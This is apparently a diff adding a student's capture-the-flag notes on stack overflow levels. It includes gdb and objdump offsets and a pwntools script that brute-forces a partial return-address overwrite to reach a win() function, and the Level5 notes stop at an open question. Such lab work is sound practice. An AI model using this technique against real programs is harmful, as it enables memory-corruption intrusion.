@@ -86,3 +86,75 @@ for c in combos:
 
 #proc.wait()
 ```
+
+# Level4
+win_offset :: p win
+
+(objdump offsets)
+win_offset = 1 310 #pwn.p8(0x10)
+main_offset = 1 538
+
+(gdb)
+b vuln = 1 369
+#changes
+Breakpoint 1 (vuln) = 0x000055b89ed5 3 371
+p win = 0x55b89ed5 3 310 (won't work)
+p main = 0x55b89ed5 3 538
+3=3
+
+p win = 0x55b89ed5 3 3 10  
+Breakpoint 1 (vuln) = 0x000055b89ed5 3 3 71
+combos = 0x?3
+
+(cyclic)
+offset = 0x000055f8bfc92535 #changes
+cyclic saved rip = 0x6e61616b6e61616a (1336)
+
+of4.py
+```
+import pwn
+
+pwn.context.terminal = ["tmux","splitw","-h"]
+#proc = pwn.gdb.debug("/challenge/stackoverflow_level4")
+#proc.send(pwn.cyclic(9000))
+
+combos = [0x03, 0x13, 0x23, 0x33, 0x43, 0x53, 0x63, 0x73, 0x83, 0x93, 0xA3, 0xB3, 0xC3, 0xD3, 0xE3, 0xF3]
+
+for c in combos:
+    proc = pwn.process("/challenge/stackoverflow_level4")
+    proc.send(b"A"*1336 + pwn.p8(0x10) + pwn.p8(c))
+    tmp = proc.recvall(.25).decode()
+    if "win" in tmp:
+        print(tmp)
+        proc.interactive()
+
+#proc.wait()
+```
+
+# Level5 (like lvl2 and lvl4)
+win_offset :: p win
+
+(objdump offsets)
+win_offset = 1 2f0 #pwn.p8(0xf0)
+win+15_off = 12ff #pwn.p8(0xff)
+main_offset = 1 5fc
+
+(gdb)
+b vuln = 1 36d
+#changes
+Breakpoint 1 (vuln) = 0x000055dfc9b7 a 36d
+p win = 0x55dfc9b7 a 2f0 (won't work)
+p win+15 = 0x555ca33d f 2ff
+p main = 0x55dfc9b7 a 5fc
+
+p win = 0x55dfc9b7 a 2 f0 
+0x000000000000 1 2 ff <+15>:    cmpl   $0x1337,-0x4(%rbp)
+combos = 0x?2 #impossible to win, how do I jump further into win()?
+
+(cyclic)
+offset = 0x0000556a8a6585f9 #changes
+cyclic saved rip = 0x6461616d6461616c (344)
+
+
+win+10 = 0x5595a06652fa
+
